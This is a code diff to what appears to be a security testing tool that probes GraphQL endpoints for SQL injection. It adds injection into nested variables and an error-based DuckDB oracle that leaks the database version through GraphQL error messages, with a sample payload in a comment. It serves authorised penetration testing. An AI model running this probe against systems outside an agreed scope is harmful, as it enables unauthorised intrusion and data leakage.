@@ -45,14 +45,74 @@ def _error_re() -> "re.Pattern":
     return re.compile("|".join(sigs), re.IGNORECASE)
 
 
+def _inject_path(body: dict, dotted: str, value: Any) -> dict:
+    """Set a (possibly nested) GraphQL variable under ``variables``, e.g. ``v.contentTitle`` ->
+    variables["v"]["contentTitle"]. Deep-copies so the template is not mutated across payloads;
+    creates intermediate dicts only if missing (normally the captured operation body already
+    carries a valid variables.<obj>, so the other required input fields are preserved)."""
+    import copy
+    injected = copy.deepcopy(body) if isinstance(body, dict) else {}
+    variables = injected.get("variables")
+    if not isinstance(variables, dict):
+        variables = {}
+        injected["variables"] = variables
+    parts = [p for p in dotted.split(".") if p]
+    node = variables
+    for key in parts[:-1]:
+        nxt = node.get(key)
+        if not isinstance(nxt, dict):
+            nxt = {}
+            node[key] = nxt
+        node = nxt
+    if parts:
+        node[parts[-1]] = value
+    return injected
+
+
+# DuckDB error(expr) embeds the expression's value in "Invalid Input Error: <value>" (also
+# "Conversion Error: ..."), so a `(SELECT error(version()))` payload leaks version() in the
+# GraphQL errors[] message. Parse that out as read-only impact proof.
+_DUCKDB_LEAK_RE = re.compile(r"(?:invalid input error|conversion error|binder error)\s*:\s*"
+                             r"([^\"'}\n]{1,120})", re.IGNORECASE)
+_VERSION_RE = re.compile(r"v?\d+\.\d+(?:\.\d+)?")
+
+
+def _graphql_error_messages(text: str) -> list:
+    import json as _json
+    try:
+        data = _json.loads(text)
+    except Exception:
+        return []
+    errs = data.get("errors") if isinstance(data, dict) else None
+    out = []
+    for e in (errs if isinstance(errs, list) else []):
+        msg = e.get("message") if isinstance(e, dict) else None
+        if isinstance(msg, str):
+            out.append(msg)
+    return out
+
+
+def _extract_duckdb_version(text: str) -> Optional[str]:
+    """Pull a leaked version()/value out of a DuckDB error surfaced in a GraphQL errors[] message."""
+    for msg in _graphql_error_messages(text):
+        m = _DUCKDB_LEAK_RE.search(msg)
+        if m:
+            cand = m.group(1).strip()
+            vm = _VERSION_RE.search(cand)
+            return vm.group(0) if vm else cand[:80]
+    return None
+
+
 _SCHEMA: Dict[str, Any] = {
     "type": "object",
     "properties": {
         "url": {"type": "string", "description": "Target URL (must be in scope). For GraphQL, the "
                 "graphql endpoint, e.g. https://host/reports/graphql/."},
         "method": {"type": "string", "description": "HTTP method (default POST)."},
-        "injection_point": {"type": "string", "description": "Name of the parameter / GraphQL "
-                            "variable to inject into, e.g. 'title' or 'id'."},
+        "injection_point": {"type": "string", "description": "Parameter / GraphQL variable to "
+                            "inject into, e.g. 'title' or 'id'. For a GraphQL variable NESTED in an "
+                            "input object, use a dotted path relative to variables, e.g. "
+                            "'v.contentTitle' for variables.v.contentTitle."},
         "injection_location": {"type": "string", "description": "Where the parameter lives: "
                                "'graphql_var' (a GraphQL variable), 'query' (URL query string), or "
                                "'body' (JSON/form body). Default 'graphql_var'."},
@@ -183,7 +243,10 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
         """Inject ``value`` at the chosen point and send through the proxy. Returns the response."""
         try:
             if location == "graphql_var":
-                injected = _inject(gql_body, point, value)
+                # Dotted injection_point (e.g. v.contentTitle) targets a NESTED input field; a
+                # plain name is a top-level variable (reuse the shared helper).
+                injected = (_inject_path(gql_body, point, value) if "." in point
+                            else _inject(gql_body, point, value))
                 return await client.request(method, url, headers=_headers(),
                                             content=json.dumps(injected).encode("utf-8"))
             if location == "query":
@@ -272,6 +335,22 @@ async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
                     proof_summary = proof.summary()
                     steps.append({"label": "impact proof", "technique": proof.technique,
                                   "dbms": proof.dbms, "facts": facts})
+                # DuckDB version-leak oracle (GraphQL errors[]): extract_db_facts does not cover
+                # DuckDB, so when nothing was extracted, try the read-only error(version()) leak and
+                # parse the version from the GraphQL error message. Best-effort; keeps CONFIRMED.
+                if not facts and location == "graphql_var":
+                    for payload in get_payloads("sqli", "duckdb_version"):
+                        resp = await _send_value(client, payload)
+                        if resp is None:
+                            continue
+                        ver = _extract_duckdb_version(resp.text)
+                        if ver:
+                            facts = {"version": ver}
+                            technique = "error-based (DuckDB version leak)"
+                            proof_summary = f"DuckDB version()={ver} leaked via error()"
+                            steps.append({"label": "duckdb version leak", "payload": payload,
+                                          "version": ver})
+                            break
     except Exception as exc:
         return {"ok": False, "error": f"probe failed: {str(exc)[:200]}", "steps": steps}
 
